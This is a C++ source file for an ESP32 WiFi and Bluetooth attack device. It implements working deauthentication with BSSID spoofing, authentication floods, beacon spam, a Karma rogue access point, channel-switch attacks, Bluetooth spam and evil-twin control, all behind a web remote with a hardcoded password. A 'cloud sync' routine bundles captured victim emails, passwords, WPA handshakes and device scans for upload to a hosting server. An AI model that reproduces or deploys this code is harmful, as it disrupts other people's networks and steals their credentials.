#include "attack_control.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>

#include "attack_engine.h"
#include "karma.h"
#include "bt_spam.h"
#include "wifi_state.h"
#include "radio_manager.h"
#include "web_utils.h"
#include "telemetry.h"
#include "ble_scan.h"
#include "web_remote.h"
#include "ui_screens.h"

// State yang didefinisikan di main.cpp.
extern DNSServer dnsServer;
extern bool isKarmaRunning;
extern unsigned long karmaScanStart;
extern bool isDeauthRunning;
extern bool isBeaconRunning;
extern bool isProbeRunning;
extern bool isGlobalDeauthRunning;
extern bool isAuthFloodRunning;
extern bool isBTSpamRunning;
extern bool isCSARunning;
extern bool isEvilTwinRunning;
extern bool isReleasing;
extern bool isVerifying;
// Engine control
// ═══════════════════════════════════════════════
void applyPromiscuousFilter(bool probeOnly) {
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = probeOnly
    ? WIFI_PROMIS_FILTER_MASK_MGMT
    : (WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA);
  esp_wifi_set_promiscuous_filter(&filter);
}

// ── Karma ──
void startKarmaScan() {
  memset(g_karmaSSIDs, 0, sizeof(g_karmaSSIDs));
  memset(g_karmaClients, 0, sizeof(g_karmaClients));
  g_karmaSSIDCount = 0;
  g_karmaClientCount = 0;
  g_karmaResponses = 0;
  g_karmaActiveMode = true;

  radioSetMode(RADIO_AP_STA);
  delay(200);
  if (!isWebRemoteRunning) {
    restoreOriginalApMac();
    WiFi.softAP("Karma_Scan", NULL, 1, 1, 8);
    delay(300);
  }

  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);

  setAttackMode(ATK_KARMA);
  isKarmaRunning = true;
  karmaScanStart = millis();
  Serial.println("[KARMA] Scan started (20s, active mode)");
}

void stopKarmaScan() {
  isKarmaRunning = false;
  setAttackMode(ATK_IDLE);
  resetWifiStateAfterAttack();
  Serial.println("[KARMA] Scan stopped");
}

// ── Deauth ──
void startDeauthEngine() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  } else {
    // PENTING: set_mac WIFI_IF_AP harus dilakukan saat interface AP aktif
    // (mode AP_STA), bukan saat STA. Sebelumnya pakai RADIO_STA sehingga
    // esp_wifi_set_mac gagal dgn error 12293 (ESP_ERR_WIFI_IF) dan deauth
    // memakai MAC asli -> target tidak terputus.
    radioSetMode(RADIO_AP_STA);
    delay(50);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] set_mac failed (%d), pakai MAC existing\n", macErr);
      }
      delay(50);
    }
    // SoftAP dibuat langsung di channel target agar frame deauth keluar
    // di channel yang sama dengan AP korban (bukan channel 1).
    WiFi.softAP("Deauther_Fix", "12345678", g_targetChannel, 1); delay(400);
  }
  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  resetPacketCounters();
  setVictimFound(false);
  isDeauthRunning = true;
  setAttackMode(ATK_DEAUTH_TARGET);
  Serial.printf("[DEAUTH] Target %02X:%02X:%02X:%02X:%02X:%02X ch=%d burst=%d\n",
                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                g_targetChannel, cfg_deauth_burst);
}

void stopDeauthEngine() {
  isDeauthRunning = false;
  setAttackMode(ATK_IDLE);
  resetWifiStateAfterAttack();
}

void startAuthFlood() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  } else {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] set_mac failed (%d)\n", macErr);
      }
      delay(50);
    }
    WiFi.softAP("AuthFlood", "12345678", 1, 1); delay(300);
  }
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  resetPacketCounters();
  isAuthFloodRunning = true;
  setAttackMode(ATK_AUTH_FLOOD);
  Serial.printf("[AUTH] Flood ke BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d burst=%d\n",
                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                g_targetChannel, cfg_auth_burst);
}

void stopAuthFlood() {
  isAuthFloodRunning = false;
  setAttackMode(ATK_IDLE);
  resetWifiStateAfterAttack();
  Serial.println("[AUTH] Flood dihentikan");
}

void startGlobalDeauth() {
  if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  if (!isWebRemoteRunning) {
    restoreOriginalApMac();
    WiFi.softAP("Global_Deauth", "12345678", 1, 1); delay(300);
  }
  esp_wifi_set_promiscuous(false);
  resetPacketCounters();
  isGlobalDeauthRunning = true;
  setAttackMode(ATK_DEAUTH_GLOBAL);
  Serial.println("[GLOBAL] Deauth semua kanal dimulai");
}

void stopGlobalDeauth() {
  isGlobalDeauthRunning = false;
  setAttackMode(ATK_IDLE);
  resetWifiStateAfterAttack();
  Serial.println("[GLOBAL] Deauth dihentikan");
}

void startBeaconSpam() {
  if (!isWebRemoteRunning) {
    radioSetMode(RADIO_AP);
    restoreOriginalApMac();
    WiFi.softAP("Beacon_Init", "12345678", 1, 1); delay(300);
  } else {
    radioSetMode(RADIO_AP_STA);
  }
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
  resetPacketCounters();
  isBeaconRunning = true;
  setAttackMode(ATK_BEACON);
}

void stopBeaconSpam() {
  isBeaconRunning = false;
  setAttackMode(ATK_IDLE);
  resetWifiStateAfterAttack();
}

void startProbeSniffer() {
  if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  if (!isWebRemoteRunning) {
    restoreOriginalApMac();
    WiFi.softAP("Probe_Sniff", "12345678", 1, 1); delay(200);
  }
  portENTER_CRITICAL(&g_probeLogMux);
  g_probeLogHead = 0; g_probeLogCount = 0;
  portEXIT_CRITICAL(&g_probeLogMux);
  applyPromiscuousFilter(true);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  isProbeRunning = true;
  setAttackMode(ATK_PROBE);
}

void stopProbeSniffer() {
  isProbeRunning = false;
  setAttackMode(ATK_IDLE);
  resetWifiStateAfterAttack();
}

void startBTSpam() {
  radioSetMode(RADIO_OFF);
  if (btSpamInit()) {
    isBTSpamRunning = true;
    setAttackMode(ATK_IDLE);
  }
}

void stopBTSpam() {
  btSpamStop();
  isBTSpamRunning = false;
  resetWifiStateAfterAttack();
}

// ── CSA  [PATCH 2] ──
void startCSAAttack() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  } else {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] CSA set_mac failed (%d)\n", macErr);
      }
      delay(50);
    }
    WiFi.softAP("CSA_Init", "12345678", 1, 1); delay(300);
  }
  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);

  strncpy(g_csaTargetSSID, targetSSID.c_str(), 32);
  g_csaTargetSSID[32] = 0;

  resetPacketCounters();
  setVictimFound(false);
  isCSARunning = true;
  setAttackMode(ATK_CSA);
  Serial.printf("[CSA] Started on BSSID %02X:%02X:%02X:%02X:%02X:%02X ch=%d SSID=%s\n",
                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                g_targetChannel, g_csaTargetSSID);
}

void stopCSAAttack() {
  isCSARunning = false;
  setAttackMode(ATK_IDLE);
  resetWifiStateAfterAttack();
  Serial.println("[CSA] Stopped");
}

// ── Web Remote ──
void startWebRemote() {
  radioSetMode(RADIO_AP_STA);
  delay(200);
  restoreOriginalApMac();
  WiFi.softAP("NISKALA_CTRL", "niskala123", 1, 0, 4);
  delay(300);
  server.begin();
  dnsServer.start(53, "*", WiFi.softAPIP());
  isWebRemoteRunning = true;
  Serial.println("[WEB] Remote control aktif");
  drawWebRemoteScreen();
}

void stopWebRemote() {
  server.stop();
  dnsServer.stop();
  resetWifiStateAfterAttack();
  isWebRemoteRunning = false;
  Serial.println("[WEB] Remote control berhenti");
}

// Cloud Sync (kirim hasil ke hosting)
// ------------------------------------------------------------------
String buildSyncJson() {
  String mac = WiFi.macAddress();
  String j = "{\"device\":\"NISKALA\",\"mac\":\"" + mac + "\",\"uptime\":" + String(millis() / 1000) + ",";

  // probe log
  j += "\"probe\":[";
  portENTER_CRITICAL(&g_probeLogMux);
  int cnt = g_probeLogCount;
  int head = g_probeLogHead;
  ProbeEntry snap[PROBE_LOG_SIZE];
  for (int i = 0; i < cnt; i++) {
    int idx = (head - cnt + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
    snap[i] = g_probeLog[idx];
  }
  portEXIT_CRITICAL(&g_probeLogMux);
  for (int i = 0; i < cnt; i++) {
    if (i) j += ",";
    char m[18];
    snprintf(m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X",
             snap[i].mac[0], snap[i].mac[1], snap[i].mac[2],
             snap[i].mac[3], snap[i].mac[4], snap[i].mac[5]);
    String ssid = snap[i].ssid[0] ? String(snap[i].ssid) : String("(hidden)");
    j += "{\"mac\":\"" + String(m) + "\",\"rssi\":" + String(snap[i].rssi) + ",\"ssid\":\"" + jsonEscape(ssid) + "\"}";
  }
  j += "],";

  // karma
  j += "\"karma\":[";
  for (int i = 0; i < g_karmaSSIDCount; i++) {
    if (i) j += ",";
    j += "{\"ssid\":\"" + jsonEscape(String(g_karmaSSIDs[i].ssid)) + "\",\"probe_count\":" + String(g_karmaSSIDs[i].probeCount) + ",\"auth_count\":" + String(g_karmaSSIDs[i].authCount) + "}";
  }
  j += "],";

  // passwords
  int total = prefs.getInt("pwd_count", 0);
  j += "\"passwords\":[";
  for (int i = 0; i < total; i++) {
    String entry = prefs.getString(("pwd_" + String(i)).c_str(), "");
    int p1 = entry.indexOf('|');
    String email = (p1 > 0) ? entry.substring(0, p1) : entry;
    String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
    int p2 = rest.indexOf('|');
    String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
    String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";
    if (i) j += ",";
    j += "{\"email\":\"" + jsonEscape(email) + "\",\"password\":\"" + jsonEscape(pass) + "\",\"verified\":\"" + ver + "\"}";
  }
  j += "],\"eapol\":" + buildEapolJson() + ",\"ble\":[\n";
  for (int i = 0; i < g_bleScanCount; i++) {
    if (i) j += ",";
    j += "{\"mac\":\"" + String(g_bleScanLog[i].mac) + "\",\"name\":\"" + jsonEscape(String(g_bleScanLog[i].name)) + "\",\"rssi\":" + String(g_bleScanLog[i].rssi) + ",\"seen_count\":" + String(g_bleScanLog[i].seenCount) + "}";
  }
  j += "]}";
  return j;
}

void stopAttacksKeepWebRemote() {
  if (isDeauthRunning) { isDeauthRunning = false; esp_wifi_set_promiscuous(false); }
  if (isBeaconRunning) isBeaconRunning = false;
  if (isAuthFloodRunning) isAuthFloodRunning = false;
  if (isGlobalDeauthRunning) isGlobalDeauthRunning = false;
  if (isProbeRunning) { isProbeRunning = false; esp_wifi_set_promiscuous(false); }
  if (isBTSpamRunning) { btSpamStop(); isBTSpamRunning = false; }
  if (isCSARunning) { isCSARunning = false; esp_wifi_set_promiscuous(false); }
  if (isKarmaRunning) { isKarmaRunning = false; esp_wifi_set_promiscuous(false); }
  if (isEvilTwinRunning) {
    isEvilTwinRunning = false;
    isReleasing = false;
    isVerifying = false;
    verifyState = 0;
    server.stop();
    dnsServer.stop();
    esp_wifi_set_promiscuous(false);
  }
  setAttackMode(ATK_IDLE);
  logEvent("STOP attacks (keep web)");
}

// Hentikan semua modul serangan tanpa merusak AP kontrol saat idle
void stopAllAttacks() {
  if (isDeauthRunning) stopDeauthEngine();
  if (isBeaconRunning) stopBeaconSpam();
  if (isAuthFloodRunning) stopAuthFlood();
  if (isGlobalDeauthRunning) stopGlobalDeauth();
  if (isProbeRunning) stopProbeSniffer();
  if (isBTSpamRunning) stopBTSpam();
  if (isCSARunning) stopCSAAttack();
  if (isKarmaRunning) stopKarmaScan();
  if (isEvilTwinRunning) {
    isEvilTwinRunning = false;
    isReleasing = false;
    isVerifying = false;
    verifyState = 0;
    verifyAttempts = 0;
    server.stop();
    dnsServer.stop();
    resetWifiStateAfterAttack();
  }
  setAttackMode(ATK_IDLE);
  logEvent("STOP all attacks");
}

// ── Evil Twin  [PATCH 5 MAC cloning] ──
